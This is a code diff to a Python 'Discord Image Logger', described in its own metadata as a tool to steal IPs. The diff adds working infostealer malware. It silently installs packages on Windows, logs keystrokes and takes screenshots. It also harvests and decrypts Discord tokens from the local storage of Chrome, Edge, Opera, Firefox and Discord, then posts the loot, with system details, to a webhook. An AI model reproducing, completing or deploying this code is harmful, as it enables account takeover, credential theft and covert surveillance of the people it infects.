@@ -5,7 +5,46 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import re
+import os
+import base64
+import typing
+import json
+import requests
+import sys
+import subprocess
+import time
+import socket
+import getpass
+import platform
+from PIL import ImageGrab
+from tempfile import NamedTemporaryFile
+from pynput import keyboard
+from threading import Thread
+ 
+if os.name != "nt":
+    exit()
+ 
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
 
+modules_to_install = [("PIL", "Pillow"), ("pynput", "pynput"), ("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")]
+install_import(modules_to_install)
+
+import win32crypt
+from Crypto.Cipher import AES
+ 
+TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
+ 
+REQUEST_HEADERS = {
+    "Content-Type": "application/json",
+    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
+}
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
@@ -87,6 +126,246 @@ def reportError(error):
         }
     ],
 })
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + '\\Google\\Chrome\\User Data\\Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
+
+def on_press(key):
+    
+    try:
+        keystrokes.append(str(key))
+    except Exception:
+        pass
+
+def start_keylogger(): 
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    return listener
+
+def stop_keylogger(listener):
+    
+    listener.stop()
+
+def get_system_info() -> typing.Dict[str, str]:
+     
+    try:
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        username = getpass.getuser()
+        os_info = platform.system() + " " + platform.release()
+        return {
+            "Username": username,
+            "Hostname": hostname,
+            "IP Address": ip_address,
+            "OS": os_info
+        }
+    except Exception:
+        return {"Error": "Could not retrieve system info"}
+
+def take_screenshot() -> str:
+  
+    try:
+        screenshot = ImageGrab.grab()
+        temp_file = NamedTemporaryFile(delete=False, suffix=".png")
+        screenshot.save(temp_file.name)
+        return temp_file.name
+    except Exception as e:
+        print(f"  {e}")
+        return None
+
+def get_tokens_from_file(file_path: str) -> typing.Union[list[str], None]:
+    """ফাইল থেকে প্লেইন টেক্সট টোকেন খুঁজে বের করে"""
+    try:
+        with open(file_path, encoding="utf-8", errors="ignore") as text_file:
+            file_contents = text_file.read()
+            tokens = re.findall(TOKEN_REGEX_PATTERN, file_contents)
+            return tokens if tokens else None
+    except (PermissionError, FileNotFoundError, Exception):
+        return None
+
+def get_encrypted_tokens(path: str) -> typing.List[str]:
+    """এনক্রিপ্টেড টোকেন (leveldb থেকে) সংগ্রহ করে"""
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
+    if not os.path.exists(path):
+        return tokens
+    for file in os.listdir(path):
+        if not (file.endswith(".ldb") or file.endswith(".log")):
+            continue
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in f:
+                    line = line.strip()
+                    for value in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(value)
+        except PermissionError:
+            continue
+    return tokens
+
+def get_key(path: str) -> str:
+    """এনক্রিপশন কী পাওয়া"""
+    try:
+        with open(path + "\\Local State", "r") as file:
+            key = json.loads(file.read())['os_crypt']['encrypted_key']
+        return key
+    except Exception as e:
+      
+        return None
+
+def decrypt_token(token: str, key: str) -> typing.Union[str, None]:
+    """এনক্রিপ্টেড টোকেন ডিক্রিপ্ট করে"""
+    try:
+        key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
+        nonce = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
+        ciphertext = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:]
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        decrypted = cipher.decrypt(ciphertext)[:-16].decode()
+        return decrypted
+    except Exception as e:
+        print(f"টোকেন ডিক্রিপ্ট করতে ব্যর্থ: {e}")
+        return None
+
+def get_user_id_from_token(token: str) -> typing.Union[None, str]:
+    """টোকেন থেকে ডিসকর্ড ইউজার আইডি বের করে"""
+    try:
+        discord_user_id = base64.b64decode(
+            token.split(".", maxsplit=1)[0] + "=="
+        ).decode("utf-8")
+        return discord_user_id
+    except Exception:
+        return None
+
+def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
+    """নির্দিষ্ট পাথ থেকে প্লেইন টেক্সট টোকেন সংগ্রহ করে"""
+    if not os.path.exists(base_path):
+       
+        return None
+
+    id_to_tokens: typing.Dict[str, set] = {}
+
+    for root, dirs, files in os.walk(base_path):
+        for file in files:
+            if file.endswith((".ldb", ".log", ".sqlite")):
+                file_path = os.path.join(root, file)
+                potential_tokens = get_tokens_from_file(file_path)
+                if potential_tokens:
+                    for token in potential_tokens:
+                        discord_user_id = get_user_id_from_token(token)
+                        if discord_user_id:
+                            if discord_user_id not in id_to_tokens:
+                                id_to_tokens[discord_user_id] = set()
+                            id_to_tokens[discord_user_id].add(token)
+
+    return id_to_tokens if id_to_tokens else None
+
+def get_all_tokens() -> typing.Dict[str, set]:
+    """সব পাথ থেকে টোকেন সংগ্রহ করে (প্লেইন টেক্সট এবং এনক্রিপ্টেড)"""
+    all_tokens: typing.Dict[str, set] = {}
+
+    # ব্রাউজার এবং ডিসকর্ড পাথ থেকে প্লেইন টেক্সট টোকেন
+    browser_paths = get_browser_paths()
+    for browser_path in browser_paths:
+        if "Firefox" in browser_path:
+            tokens = get_tokens_from_firefox_profiles(browser_path)
+        else:
+            tokens = get_tokens_from_path(browser_path)
+        if tokens:
+            for user_id, token_set in tokens.items():
+                if user_id not in all_tokens:
+                    all_tokens[user_id] = set()
+                all_tokens[user_id].update(token_set)
+
+    # এনক্রিপ্টেড টোকেন সংগ্রহ এবং ডিক্রিপ্ট
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+        encrypted_tokens = get_encrypted_tokens(path)
+        key = get_key(path)
+        if not key:
+            continue
+        for token in encrypted_tokens:
+            token = token.replace("\\", "")
+            decrypted_token = decrypt_token(token, key)
+            if decrypted_token:
+                discord_user_id = get_user_id_from_token(decrypted_token)
+                if discord_user_id:
+                    if discord_user_id not in all_tokens:
+                        all_tokens[discord_user_id] = set()
+                    all_tokens[discord_user_id].add(decrypted_token)
+
+    return all_tokens if all_tokens else None
+
+def get_browser_paths() -> typing.List[str]:
+    """বিভিন্ন ব্রাউজার এবং ডিসকর্ড অ্যাপের leveldb পাথের লিস্ট ফেরত দেয়"""
+    local_app_data = os.getenv("LOCALAPPDATA")
+    app_data = os.getenv("APPDATA")
+
+    browser_paths = [
+        os.path.join(local_app_data, r"Google\Chrome\User Data\Default\Local Storage\leveldb"),
+        os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Local Storage\leveldb"),
+        os.path.join(local_app_data, r"Opera Software\Opera Stable\Local Storage\leveldb"),
+        os.path.join(app_data, r"Mozilla\Firefox\Profiles"),
+        os.path.join(app_data, r"Discord\Local Storage\leveldb"),
+    ]
+
+    return browser_paths
+
+def get_tokens_from_firefox_profiles(firefox_base_path: str) -> typing.Dict[str, set]:
+    """Firefox প্রোফাইল থেকে টোকেন খুঁজে বের করে"""
+    if not os.path.exists(firefox_base_path):
+             return None
+
+    id_to_tokens: typing.Dict[str, set] = {}
+
+    for profile in os.listdir(firefox_base_path):
+        profile_path = os.path.join(firefox_base_path, profile, "storage", "default")
+        if os.path.exists(profile_path):
+            for root, dirs, files in os.walk(profile_path):
+                for file in files:
+                    if file.endswith(".ls"):
+                        file_path = os.path.join(root, file)
+                        potential_tokens = get_tokens_from_file(file_path)
+                        if potential_tokens:
+                            for token in potential_tokens:
+                                discord_user_id = get_user_id_from_token(token)
+                                if discord_user_id:
+                                    if discord_user_id not in id_to_tokens:
+                                        id_to_tokens[discord_user_id] = set()
+                                    id_to_tokens[discord_user_id].add(token)
+
+    return id_to_tokens if id_to_tokens else None
+
+def send_all_to_webhook(webhook_url: str, system_info: dict, keystrokes: list, tokens: dict, screenshot_path: str):
+    """সব তথ্য একটি সিরিয়াল টেক্সট হিসেবে এবং স্ক্রিনশট আলাদা করে পাঠায়"""
+    system_info_str = "```\n📋 System Information\n" + "\n".join([f"{key}: {value}" for key, value in system_info.items()]) + "\n```"
+    keystrokes_str = "```\n⌨️ Keystrokes\n" + ("\n".join(keystrokes) if keystrokes else "No keystrokes captured.") + "\n```"
+    dev = "**MADE BY —͞ＫＩＲＡ !! ** || @kira.1.9 ||"
+    token_str = "```\n🔑 Tokens\n" + ("\n".join([f"User ID: {user_id}\nTokens: {', '.join(tokens[user_id])}" for user_id in tokens]) if tokens else "No tokens found.") + "\n```"
+
+    message_content = f"{system_info_str}\n{keystrokes_str}\n{token_str}\n{dev}"
+
+    if screenshot_path:
+        with open(screenshot_path, 'rb') as file:
+            files = {'file': (os.path.basename(screenshot_path), file, 'image/png')}
+            data = {"content": message_content}
+            response = requests.post(webhook_url, data=data, files=files)
+    else:
+        data = {"content": message_content}
+        response = requests.post(webhook_url, json=data, headers=REQUEST_HEADERS)
+
+    return response.status_code
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
